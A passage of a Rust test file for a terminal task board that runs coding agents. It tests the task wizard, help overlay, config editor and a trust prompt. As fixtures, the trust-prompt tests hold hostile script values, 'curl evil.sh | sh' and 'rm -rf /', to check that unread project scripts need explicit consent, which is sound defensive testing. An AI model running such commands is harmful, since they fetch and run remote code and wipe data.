fn esc_closes_an_open_dropdown_without_leaving_the_wizard() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);

    type_str(&mut app, "see !");
    assert!(app.state.task_ref_search.is_some());

    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.task_ref_search.is_none(), "the picker closed");
    assert!(
        app.state.wizard.is_some(),
        "and only the picker closed — the wizard survives"
    );
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
    assert_eq!(wiz(&app).as_str(), "see ", "the `!` went with it");
}

/// The file dropdown records a caret-relative `start_pos`, so its pattern has
/// to be typed at the caret too — appending to the end of the buffer would make
/// the commit splice over the wrong range.
#[test]
#[cfg(feature = "test-mocks")]
fn the_file_dropdown_types_at_the_caret_not_the_end() {
    // The dropdown queries the repo for candidates; an empty answer is enough,
    // since this is about where the typed text lands, not what it matches.
    let mut app = make_test_app_with_agents();
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_list_files().returning(|_| vec![]);
    app.state.git_ops = Arc::new(mock_git);
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);

    type_str(&mut app, "a tail");
    for _ in 0..4 {
        press_key(&mut app, KeyCode::Left);
    }
    type_str(&mut app, "#ab");

    assert_eq!(
        wiz(&app).as_str(),
        "a #abtail",
        "the trigger and its pattern land at the caret"
    );
}

/// First run is the config editor, opened on the one question it needs to ask,
/// rather than a menu of its own.
#[test]
#[cfg(feature = "test-mocks")]
fn first_run_opens_the_config_editor_on_the_agent_field() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);

    let app = App::new_for_test_with_flags(
        Some(dir.path().to_path_buf()),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
        crate::FeatureFlags {
            experimental: false,
            no_init_scripts: false,
            first_run: true,
        },
    )
    .unwrap();

    let editor = app
        .state
        .config_editor
        .as_ref()
        .expect("first run opens the editor");
    assert_eq!(
        editor.current_field().map(|f| f.id),
        Some(crate::tui::config_editor::FieldId::DefaultAgent),
        "and lands on the question first run is actually asking"
    );
    assert!(editor.status.is_some(), "with a word about what to do");
}

/// Every other launch opens straight onto the board.
#[test]
#[cfg(feature = "test-mocks")]
fn a_normal_launch_does_not_open_the_config_editor() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let app = make_test_app_at(dir.path());
    assert!(app.state.config_editor.is_none());
}

// =============================================================================
// The `?` help overlay
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn question_mark_opens_and_closes_the_help_overlay() {
    let mut app = make_test_app_with_agents();
    assert!(app.state.help_scroll.is_none());

    press_key(&mut app, KeyCode::Char('?'));
    assert_eq!(app.state.help_scroll, Some(0));

    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.help_scroll.is_none());

    // `?` also toggles it shut, since that is the key that is already under the
    // finger.
    press_key(&mut app, KeyCode::Char('?'));
    press_key(&mut app, KeyCode::Char('?'));
    assert!(app.state.help_scroll.is_none());
}

/// It is a reference, not a menu: the keys it does not use must not fall
/// through and act on the board behind it.
#[test]
#[cfg(feature = "test-mocks")]
fn the_help_overlay_swallows_board_keys() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('?'));

    for code in [KeyCode::Char('o'), KeyCode::Char(','), KeyCode::Enter] {
        press_key(&mut app, code);
    }
    assert!(app.state.wizard.is_none(), "no task wizard opened");
    assert!(app.state.config_editor.is_none(), "no config editor opened");
    assert!(app.state.help_scroll.is_some(), "and the overlay stayed up");
}

#[test]
#[cfg(feature = "test-mocks")]
fn the_help_overlay_scrolls_within_its_bounds() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('?'));
    app.state.help_max_scroll.set(30);

    press_key(&mut app, KeyCode::Char('k'));
    assert_eq!(app.state.help_scroll, Some(0), "clamped at the top");

    press_key(&mut app, KeyCode::Char('j'));
    assert_eq!(app.state.help_scroll, Some(1));

    press_key(&mut app, KeyCode::End);
    assert_eq!(app.state.help_scroll, Some(30));
    press_key(&mut app, KeyCode::Char('j'));
    assert_eq!(app.state.help_scroll, Some(30), "clamped at the bottom");

    press_key(&mut app, KeyCode::Home);
    assert_eq!(app.state.help_scroll, Some(0));
}

/// The chords the task pane scrolls with work here too, from the same table —
/// someone who learns `C-d` once should not find it inert in the overlay.
#[test]
#[cfg(feature = "test-mocks")]
fn the_help_overlay_uses_the_same_scroll_chords_as_a_task_pane() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('?'));
    app.state.help_max_scroll.set(60);

    app.handle_key(key_event(KeyCode::Char('d'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.help_scroll, Some(20), "C-d pages down");

    app.handle_key(key_event(KeyCode::Char('u'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.help_scroll, Some(0), "C-u pages back");

    app.handle_key(key_event(KeyCode::Char('n'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.help_scroll, Some(5), "C-n moves five lines");

    app.handle_key(key_event(KeyCode::Char('p'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.help_scroll, Some(0));

    press_key(&mut app, KeyCode::PageDown);
    assert_eq!(app.state.help_scroll, Some(20));
    press_key(&mut app, KeyCode::PageUp);
    assert_eq!(app.state.help_scroll, Some(0));

    app.handle_key(key_event(KeyCode::Char('g'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.help_scroll, Some(60), "C-g jumps to the bottom");
}

/// The clamp is to what the renderer could actually show. Against the table
/// length instead, jumping to the bottom parks the offset past the last
/// screenful and the next `C-u` moves nothing, reading as a dead key.
#[test]
#[cfg(feature = "test-mocks")]
fn paging_back_from_the_bottom_moves_on_the_first_press() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('?'));
    // Far fewer rows fit than the table holds, which is the normal case.
    app.state.help_max_scroll.set(12);

    app.handle_key(key_event(KeyCode::Char('g'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.help_scroll, Some(12), "not the table length");

    app.handle_key(key_event(KeyCode::Char('u'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(
        app.state.help_scroll,
        Some(0),
        "one press moves, rather than burning off invisible offset"
    );
}

// =============================================================================
// The trust prompt
//
// This gate decides whether shell commands the user has not read are allowed to
// run, so what it accepts matters more than most key handling.
// =============================================================================

#[cfg(feature = "test-mocks")]
fn app_awaiting_trust() -> (App, tempfile::TempDir) {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
    std::fs::write(
        dir.path().join(".agtx/config.toml"),
        "init_script = \"curl evil.sh | sh\"\ncleanup_script = \"rm -rf /\"\n",
    )
    .unwrap();
    let app = make_test_app_at(dir.path());
    (app, dir)
}

/// Accepting any key would let typing ahead after launch, or reaching for an
/// unrelated shortcut, silently grant trust.
#[test]
#[cfg(feature = "test-mocks")]
fn an_unrelated_key_neither_trusts_nor_dismisses() {
    let _guard = redirect_config_dir();
    let (mut app, dir) = app_awaiting_trust();
    app.state.trust_confirm_popup = Some(TrustConfirmPopup {
        project_path: dir.path().to_path_buf(),
        dangerous: vec![],
    });

    for code in [
        KeyCode::Char(','),
        KeyCode::Char('o'),
        KeyCode::Enter,
        KeyCode::Char(' '),
    ] {
        press_key(&mut app, code);
        assert!(
            app.state.trust_confirm_popup.is_some(),
            "{code:?} should have left the question on screen"
        );
    }

    let store = crate::config::TrustStore::load().unwrap();
    assert!(!store.is_trusted(dir.path()), "and granted nothing");
}

#[test]
#[cfg(feature = "test-mocks")]
fn y_trusts_the_project() {
    let _guard = redirect_config_dir();
    let (mut app, dir) = app_awaiting_trust();
    app.state.trust_confirm_popup = Some(TrustConfirmPopup {
        project_path: dir.path().to_path_buf(),
        dangerous: vec![],
    });

    press_key(&mut app, KeyCode::Char('y'));

    assert!(app.state.trust_confirm_popup.is_none());
    let store = crate::config::TrustStore::load().unwrap();
    assert!(store.is_trusted(dir.path()));
    assert!(!app.state.flags.no_init_scripts, "scripts are re-enabled");
}

/// Declining is a real answer, not just a way to postpone: the popup closes and
/// the fields stay off.
#[test]
#[cfg(feature = "test-mocks")]
fn n_and_esc_decline_without_trusting() {
    for code in [KeyCode::Char('n'), KeyCode::Esc] {
        let _guard = redirect_config_dir();
        let (mut app, dir) = app_awaiting_trust();
        app.state.trust_confirm_popup = Some(TrustConfirmPopup {
            project_path: dir.path().to_path_buf(),
            dangerous: vec![],
        });

        press_key(&mut app, code);

        assert!(app.state.trust_confirm_popup.is_none(), "{code:?}");
        let store = crate::config::TrustStore::load().unwrap();
        assert!(!store.is_trusted(dir.path()), "{code:?} must not trust");
    }
}

/// Consenting to a script you cannot see is not consent, so the prompt carries
/// the values themselves — the three fields `App::new` strips.
#[test]
fn the_prompt_carries_the_scripts_it_is_asking_about() {
    let config = crate::config::ProjectConfig {
        init_script: Some("curl evil.sh | sh".to_string()),
        copy_files: Some(".env".to_string()),
        ..Default::default()
    };

    assert_eq!(
        dangerous_fields(&config),
        vec![
            ("init_script", "curl evil.sh | sh".to_string()),
            ("copy_files", ".env".to_string()),
        ],
        "values verbatim, in a fixed order, and only the fields that are set"
    );
}

#[test]
fn a_project_declaring_nothing_dangerous_has_nothing_to_show() {
    assert!(dangerous_fields(&crate::config::ProjectConfig::default()).is_empty());
}

// =============================================================================
// Config editor wiring
//
// The editor's own logic is tested in `config_editor_tests.rs`; these cover the
// parts only the App can do — opening it on the right configs, and what a save
// touches.
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn comma_opens_the_config_editor() {
    let _guard = redirect_config_dir();
    let mut app = make_test_app_with_agents();
    assert!(app.state.config_editor.is_none());
    press_key(&mut app, KeyCode::Char(','));
    assert!(app.state.config_editor.is_some());
}

/// The editor loads the configs from disk rather than reconstructing them from
/// `state.config`, which is a *merged* view — writing that back would bake
/// every global default into the project file as an explicit override.
#[test]
#[cfg(feature = "test-mocks")]
fn the_editor_opens_on_the_files_not_the_merged_view() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
    std::fs::write(
        dir.path().join(".agtx/config.toml"),
        "workflow_plugin = \"gsd\"\n",
    )
    .unwrap();

    let mut app = make_test_app_at(dir.path());
    app.open_config_editor();
    let editor = app.state.config_editor.as_ref().unwrap();

    let project = editor.project.as_ref().expect("a project is open");
    assert_eq!(project.workflow_plugin.as_deref(), Some("gsd"));
    assert_eq!(
        project.base_branch, None,
        "an unset project field stays unset rather than inheriting the global value"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_dashboard_editor_has_no_project_section() {
    let _guard = redirect_config_dir();
    let mut app = App::new_for_test(
        None,
        Arc::new(MockTmuxOperations::new()),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();
    app.open_config_editor();
    let editor = app.state.config_editor.as_ref().unwrap();
    assert!(editor.project.is_none());
    assert!(!editor.sections.iter().any(|s| s.title == "Project"));
}

/// Saving the project config changes its hash, which *is* its trust. Without
/// the re-record, editing any setting would silently untrust the project and
/// cost it its scripts on the next launch.
#[test]
#[cfg(feature = "test-mocks")]
fn saving_the_config_keeps_a_trusted_project_trusted() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
    std::fs::write(
        dir.path().join(".agtx/config.toml"),
        "init_script = \"echo hi\"\n",
    )
    .unwrap();
    let mut store = crate::config::TrustStore::load().unwrap();
    store.trust_project(dir.path()).unwrap();

    let mut app = make_test_app_at(dir.path());
    app.open_config_editor();
    app.state
        .config_editor
        .as_mut()
        .unwrap()
        .project
        .as_mut()
        .unwrap()
        .base_branch = Some("develop".to_string());
    app.save_config_editor().unwrap();

    let store = crate::config::TrustStore::load().unwrap();
    assert!(
        store.is_trusted(dir.path()),
        "editing config must not untrust the project"
    );
    let saved = crate::config::ProjectConfig::load(dir.path()).unwrap();
    assert_eq!(saved.base_branch.as_deref(), Some("develop"));
    assert_eq!(
        saved.init_script.as_deref(),
        Some("echo hi"),
        "the untouched field is still there"
    );
}

/// A save has to be visible without a restart: the merged config every draw
/// call reads is rebuilt from the files that were just written.
#[test]
#[cfg(feature = "test-mocks")]
fn saving_re_merges_the_live_config() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let mut app = make_test_app_at(dir.path());
    app.open_config_editor();

    let editor = app.state.config_editor.as_mut().unwrap();
    editor.global.theme.color_selected = "#00ff00".to_string();
    editor.project.as_mut().unwrap().base_branch = Some("release".to_string());
    app.save_config_editor().unwrap();

    assert_eq!(app.state.config.theme.color_selected, "#00ff00");
    assert_eq!(app.state.config.base_branch, "release");
    assert!(!app.state.config_editor.as_ref().unwrap().dirty);
}

/// Closing without saving must put back the theme the preview was overwriting.
#[test]
#[cfg(feature = "test-mocks")]
fn closing_without_saving_drops_the_previewed_theme() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let mut app = make_test_app_at(dir.path());
    let original = app.state.config.theme.color_selected.clone();

    app.open_config_editor();
    app.state
        .config_editor
        .as_mut()
        .unwrap()
        .global
        .theme
        .color_selected = "#ff00ff".to_string();
    // A keystroke is what installs the preview.
    press_key(&mut app, KeyCode::Char('j'));
    assert_eq!(app.state.config.theme.color_selected, "#ff00ff");

    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.config_editor.is_none());
    assert_eq!(app.state.config.theme.color_selected, original);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wizard_tab_cycles_plugins() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Tabbing");
    advance_to(&mut app, WizardStep::Plugin);

    let len = app.state.wizard.as_ref().unwrap().plugin.options.len();
    assert!(len > 1);
    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 0);
    press_key(&mut app, KeyCode::Tab);
    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 1);
    // Tab wraps around
    for _ in 1..len {
        press_key(&mut app, KeyCode::Tab);
    }
    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 0);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wizard_saves_with_selected_plugin() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Plugin task");
    advance_to(&mut app, WizardStep::Plugin);

    // Move to a non-default plugin (index 1 should be gsd or similar)
    press_key(&mut app, KeyCode::Char('j'));
    let selected_plugin = app.state.wizard.as_ref().unwrap().plugin.options
        [app.state.wizard.as_ref().unwrap().plugin.selected]
        .name
        .clone();
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
    press_key(&mut app, KeyCode::Enter); // save with no description

    let tasks = app.state.board.tasks.clone();
    assert_eq!(tasks.len(), 1);
    assert_eq!(tasks[0].plugin.as_deref(), Some(selected_plugin.as_str()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wizard_default_plugin_saves_agtx() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Default plugin task");
    advance_to(&mut app, WizardStep::Plugin);

    // Keep default selection (index 0 = agtx) and advance
    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 0);
    assert_eq!(
        app.state.wizard.as_ref().unwrap().plugin.options[0].name,
        "agtx"
    );
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
    press_key(&mut app, KeyCode::Enter); // save with no description

    let tasks = app.state.board.tasks.clone();
    assert_eq!(tasks.len(), 1);
    // agtx should be explicitly saved, not None
    assert_eq!(tasks[0].plugin.as_deref(), Some("agtx"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wizard_uses_config_default_agent() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Config agent task");
    advance_to(&mut app, WizardStep::Prompt);
    press_key(&mut app, KeyCode::Enter);

    let tasks = app.state.board.tasks.clone();
    assert_eq!(tasks.len(), 1);
    // The agent step opens on the configured default, so walking past it
    // without touching anything saves that.
    assert_eq!(tasks[0].agent, app.state.config.default_agent);
}

/// `Task::agent` is a database field, and until the agent step existed the only
/// way to run one task on a different agent was to edit the config, start it,
/// and edit back.
#[test]
#[cfg(feature = "test-mocks")]
fn the_wizard_saves_the_agent_that_was_picked() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Runs on something else");

    advance_to(&mut app, WizardStep::Agent);
    press_key(&mut app, KeyCode::Char('j'));
    let picked = app
        .state
        .wizard
        .as_ref()
        .unwrap()
        .agent_name()
        .unwrap()
        .to_string();
    assert_ne!(picked, app.state.config.default_agent, "a real change");

    advance_to(&mut app, WizardStep::Prompt);
    press_key(&mut app, KeyCode::Enter);

    assert_eq!(app.state.board.tasks.len(), 1);
    assert_eq!(app.state.board.tasks[0].agent, picked);
}

/// `/` opens a filter on a list step. While it is open ordinary characters go
/// to the filter, which is why navigation there is arrows rather than `j`/`k`.
#[test]
#[cfg(feature = "test-mocks")]
fn slash_filters_a_list_step() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Filtering");
    advance_to(&mut app, WizardStep::Plugin);

    let all = app.state.wizard.as_ref().unwrap().plugin.matching().len();
    assert!(all > 2, "need something to filter, got {all}");

    press_key(&mut app, KeyCode::Char('/'));
    assert!(app.state.wizard.as_ref().unwrap().plugin.is_filtering());
    type_str(&mut app, "gsd");

    let list = &app.state.wizard.as_ref().unwrap().plugin;
    assert_eq!(list.matching().len(), 1, "narrowed to one");
    assert_eq!(list.selected_option().unwrap().name, "gsd");
    assert_eq!(
        list.filter.as_ref().unwrap().as_str(),
        "gsd",
        "the characters went to the filter, not to navigation"
    );
}

/// Backspacing the filter empty leaves filter mode, rather than sitting in a
/// mode with nothing typed and `j`/`k` still inert.
#[test]
#[cfg(feature = "test-mocks")]
fn emptying_the_filter_leaves_filter_mode() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Filtering");
    advance_to(&mut app, WizardStep::Plugin);

    press_key(&mut app, KeyCode::Char('/'));
    type_str(&mut app, "gs");
    press_key(&mut app, KeyCode::Backspace);
    press_key(&mut app, KeyCode::Backspace);

    assert!(!app.state.wizard.as_ref().unwrap().plugin.is_filtering());
    // ...and `j` navigates again rather than filtering.
    let before = app.state.wizard.as_ref().unwrap().plugin.selected;
    press_key(&mut app, KeyCode::Char('j'));
    assert_ne!(app.state.wizard.as_ref().unwrap().plugin.selected, before);
}

/// An open filter owns Esc the way a prompt dropdown does: closing the filter
/// must not take the whole wizard with it.
#[test]
#[cfg(feature = "test-mocks")]
fn esc_closes_an_open_filter_without_leaving_the_wizard() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Keep me");
    advance_to(&mut app, WizardStep::Plugin);

    press_key(&mut app, KeyCode::Char('/'));
    type_str(&mut app, "gsd");
    assert!(app.state.wizard.as_ref().unwrap().plugin.is_filtering());

    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.wizard.is_some(), "the wizard survives");
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Plugin));
    let list = &app.state.wizard.as_ref().unwrap().plugin;
    assert!(!list.is_filtering(), "only the filter closed");
    assert_eq!(list.matching().len(), list.options.len(), "whole list back");

    // A second Esc, with no filter to close, cancels as it does anywhere else.
    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.wizard.is_none());
}

/// The plugin list is filtered by the agent, so saving straight from the agent
/// step must not persist a plugin that agent does not support.
#[test]
#[cfg(feature = "test-mocks")]
fn saving_from_the_agent_step_refilters_the_plugin() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Agent then save");

    advance_to(&mut app, WizardStep::Agent);
    press_key(&mut app, KeyCode::Char('j'));
    let agent = app
        .state
        .wizard
        .as_ref()
        .unwrap()
        .agent_name()
        .unwrap()
        .to_string();

    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();

    assert_eq!(app.state.board.tasks.len(), 1);
    let task = &app.state.board.tasks[0];
    assert_eq!(task.agent, agent);
    // Whatever plugin was stored has to be one this agent supports.
    if let Some(name) = task.plugin.as_deref() {
        let content = skills::BUNDLED_PLUGINS
            .iter()
            .find(|(n, _, _)| *n == name)
            .map(|(_, _, c)| *c);
        if let Some(content) = content {
            let plugin: crate::config::WorkflowPlugin = toml::from_str(content).unwrap();
            assert!(
                plugin.supports_agent(&agent),
                "saved {name} for {agent}, which does not support it"
            );
        }
    }
}

/// Enter picks whatever the filter left under the cursor, and the pick survives
/// the filter closing with the step.
#[test]
#[cfg(feature = "test-mocks")]
fn a_filtered_pick_is_what_gets_saved() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Filtered pick");
    advance_to(&mut app, WizardStep::Plugin);

    press_key(&mut app, KeyCode::Char('/'));
    type_str(&mut app, "gsd");
    advance_to(&mut app, WizardStep::Prompt);
    press_key(&mut app, KeyCode::Enter);

    assert_eq!(app.state.board.tasks.len(), 1);
    assert_eq!(app.state.board.tasks[0].plugin.as_deref(), Some("gsd"));
}

// --- richer validation ---

/// A duplicate title is legal but almost never intended, and the board shows
/// titles alone — two identical cards are indistinguishable.
#[test]
#[cfg(feature = "test-mocks")]
fn a_duplicate_title_is_refused() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Fix login");
    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.board.tasks.len(), 1);

    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Fix login");
    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();

    assert_eq!(app.state.board.tasks.len(), 1, "the second was refused");
    let validation = app.state.wizard.as_ref().unwrap().validation.as_deref();
    assert!(
        validation.is_some_and(|v| v.contains("already called")),
        "{validation:?}"
    );
}

/// Editing a task must not trip over its own title.
#[test]
#[cfg(feature = "test-mocks")]
fn a_task_does_not_clash_with_itself_when_edited() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Fix login");
    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();

    // Reopen it and save without changing the title.
    press_key(&mut app, KeyCode::Enter);
    assert!(app.state.wizard.as_ref().unwrap().is_editing());
    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();

    assert!(app.state.wizard.is_none(), "saved, not refused");
    assert_eq!(app.state.board.tasks.len(), 1);
}

/// The board draws a title on one card line; one long enough to be truncated
/// everywhere it appears is not a useful name.
#[test]
#[cfg(feature = "test-mocks")]
fn an_overlong_title_is_refused_with_its_length() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, &"x".repeat(MAX_TASK_TITLE_CHARS + 1));
    press_key(&mut app, KeyCode::Enter);

    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
    let validation = app.state.wizard.as_ref().unwrap().validation.as_deref();
    assert!(
        validation.is_some_and(|v| v.contains(&format!("{}", MAX_TASK_TITLE_CHARS + 1))),
        "the message should say how long it is: {validation:?}"
    );
    assert!(app.state.board.tasks.is_empty());
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_title_at_the_limit_is_accepted() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, &"x".repeat(MAX_TASK_TITLE_CHARS));
    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.board.tasks.len(), 1);
}

/// With one agent installed there is nothing to choose, so the step does not
/// appear — the same rule the plugin step follows.
#[test]
#[cfg(feature = "test-mocks")]
fn the_agent_step_is_skipped_when_only_one_agent_is_installed() {
    let mut app = make_test_app_with_agents();
    app.state.available_agents.truncate(1);
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Only one agent");
    press_key(&mut app, KeyCode::Enter);

    assert_ne!(app.state.wizard_step(), Some(WizardStep::Agent));
    let steps = app.state.wizard.as_ref().unwrap().steps();
    assert!(!steps.contains(&WizardStep::Agent), "{steps:?}");
}

// --- Trigger Swap: / for skills, ! for task refs ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_skill_search_slash_trigger() {
    let mut app = make_test_app();
    // Enter description mode (no agents = skip to description)
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Test");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // Type `/` at start of buffer — should trigger skill search
    press_key(&mut app, KeyCode::Char('/'));
    assert!(app.state.skill_search.is_some());
    assert_eq!(wiz(&app).buffer, "/");

    // Cancel skill search
    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.skill_search.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_slash_no_trigger_mid_word() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Test");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // `/` after a letter (no space) — should NOT trigger skill search
    type_str(&mut app, "http:/");
    assert!(app.state.skill_search.is_none());
    assert!(wiz(&app).buffer.contains("http:/"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_slash_triggers_after_space() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Test");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // `/` after a space — should trigger skill search
    type_str(&mut app, "run ");
    press_key(&mut app, KeyCode::Char('/'));
    assert!(app.state.skill_search.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_task_ref_search_exclamation_trigger() {
    let mut app = make_test_app();
    // Add a task to the board so search has results
    let db = app.state.db.as_ref().unwrap();
    db.create_task(&Task::new("Setup auth", "claude", "test-project"))
        .unwrap();
    app.refresh_tasks().unwrap();
    assert_eq!(app.state.board.tasks.len(), 1);

    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "New task");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // Type `!` at start of buffer — should trigger task ref search
    press_key(&mut app, KeyCode::Char('!'));
    assert!(app.state.task_ref_search.is_some());
    let search = app.state.task_ref_search.as_ref().unwrap();
    assert_eq!(search.pattern, "");
    assert!(!search.matches.is_empty()); // Should find "Setup auth"
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_task_ref_inserts_reference() {
    let mut app = make_test_app();
    // Add a task to the board
    let db = app.state.db.as_ref().unwrap();
    db.create_task(&Task::new("Setup auth", "claude", "test-project"))
        .unwrap();
    app.refresh_tasks().unwrap();

    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Uses auth");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // Trigger task ref search
    press_key(&mut app, KeyCode::Char('!'));
    assert!(app.state.task_ref_search.is_some());

    // Select the first match
    press_key(&mut app, KeyCode::Enter);
    assert!(app.state.task_ref_search.is_none()); // search closed

    // Buffer should contain ![Setup auth]
    assert!(
        wiz(&app).buffer.contains("![Setup auth]"),
        "Buffer: {}",
        wiz(&app).buffer
    );
    // Referenced task ID should be tracked
    assert!(!app
        .state
        .wizard
        .as_ref()
        .unwrap()
        .referenced_task_ids
        .is_empty());
    // Highlighted references should contain the reference text
    assert!(app
        .state
        .wizard
        .as_ref()
        .unwrap()
        .highlighted_references
        .contains("![Setup auth]"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_task_ref_after_space() {
    let mut app = make_test_app();
    let db = app.state.db.as_ref().unwrap();
    db.create_task(&Task::new("Other task", "claude", "test-project"))
        .unwrap();
    app.refresh_tasks().unwrap();

    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Ref test");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // Type some text, then space + `!` — should trigger
    type_str(&mut app, "depends on ");
    press_key(&mut app, KeyCode::Char('!'));
    assert!(app.state.task_ref_search.is_some());
}

// --- Multi-byte character input (e.g. Korean, Japanese, Chinese) ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_korean_char_advances_cursor_by_utf8_length_in_title() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    // Type Korean char '한' (3 bytes in UTF-8)
    press_key(&mut app, KeyCode::Char('한'));
    assert_eq!(wiz(&app).buffer, "한");
    // Cursor must land on a char boundary (byte 3), not mid-character (byte 1)
